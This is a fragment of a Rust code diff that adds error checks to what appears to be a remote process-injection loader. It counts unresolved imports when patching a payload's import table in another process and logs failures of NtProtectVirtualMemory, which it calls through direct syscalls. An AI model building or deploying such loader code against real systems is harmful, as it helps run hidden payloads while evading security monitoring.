+                unresolved_count += 1;
+                0
             };
 
             if func_addr != 0 {
@@ -3057,6 +3293,12 @@ unsafe fn fix_iat_remote(
             iat_rva += 8;
         }
         desc_off += 20;
+    }
+    if unresolved_count > 0 {
+        return Err(anyhow::anyhow!(
+            "fix_iat_remote: {} import(s) could not be resolved — payload would crash at runtime",
+            unresolved_count
+        ));
     }
     Ok(())
 }
@@ -3094,7 +3336,7 @@ unsafe fn apply_section_protections(
         let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
         let mut sz = virt_size;
         let mut old = 0u32;
-        let _ = nt_syscall::syscall!(
+        let status = nt_syscall::syscall!(
             "NtProtectVirtualMemory",
             hprocess as u64,
             &mut addr as *mut _ as u64,
@@ -3102,6 +3344,15 @@ unsafe fn apply_section_protections(
             protect as u64,
             &mut old as *mut _ as u64,
         );
+        if status.as_ref().map_or(true, |s| *s < 0) {
+            tracing::warn!(
+                "apply_section_protections: NtProtectVirtualMemory(section={:?}, base={:#x}, size={:#x}) failed: {:?}",
+                &sec.Name,
+                addr as usize,
+                virt_size,
+                status
+            );
+        }
     }
 }
 
